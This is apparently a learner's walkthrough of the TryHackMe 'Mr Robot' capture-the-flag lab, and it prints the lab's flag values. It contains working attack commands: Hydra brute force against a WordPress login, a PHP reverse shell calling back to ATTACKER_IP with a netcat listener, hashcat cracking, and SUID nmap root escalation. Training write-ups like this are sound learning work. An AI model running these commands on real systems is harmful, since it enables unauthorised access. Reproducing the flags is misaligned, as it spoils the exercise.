# Mr Robot CTF — TryHackMe

**Difficulty:** Medium  
**Platform:** TryHackMe  
**Status:** In Progress (1/3 keys found)

---

## Reconnaissance

Nmap scan to find open ports.

```bash
nmap -sV 10.128.189.118
```

Results:
- Port 22 — SSH
- Port 80 — HTTP (Apache)
- Port 443 — HTTPS (Apache)

Linux machine with a web server. We go for the website.

---

## Key 1 — robots.txt

First reflex on any web target — check robots.txt.
http://TARGET_IP/robots.txt

Found two hidden files: `fsocity.dic` and `key-1-of-3.txt`

**Key 1 found.**

---

## Username Enumeration — Hydra

Site runs WordPress. WordPress tells you if a username exists or not — information leak we can exploit.

Downloaded the wordlist from the target then removed duplicates:

```bash
wget http://TARGET_IP/fsocity.dic
sort -u fsocity.dic -o fsocity.dic
hydra -L fsocity.dic -p test TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
```

**Username found:** Elliot

---

## Password Crack — Hydra

```bash
hydra -l Elliot -P fsocity.dic TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
```

**Password found:** ER28-0652

---

## Reverse Shell — WordPress Theme Editor

Logged in as Elliot. Injected a reverse shell into the 404 template via Appearance → Theme Editor.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

Listener on AttackBox:
```bash
nc -lvnp 4444
```

Triggered by visiting the 404.php file. Shell obtained.

---


## Key 2 — Privilege Escalation to Robot

Found a password file readable by everyone in robot's home directory.

```bash
cat /home/robot/password.raw-md5
```

Cracked the MD5 hash with hashcat:

```bash
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
```

**Password found:** abcdefghijklmnopqrstuvwxyz

Switched to robot user and read key 2.

**Key 2:** `822c73956184f694993bede3eb39f959`

---

## Key 3 — Root via SUID Nmap

Found nmap with SUID bit set — runs as root.

```bash
find / -perm -u=s -type f 2>/dev/null
nmap --interactive
!sh
```

Got a root shell. Read the final key.

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## What I learned

- robots.txt always worth checking
- WordPress username enumeration via error messages
- Hydra brute force on web forms
- PHP reverse shell via theme editor
- MD5 cracking with hashcat
- SUID binary exploitation for privilege escalation
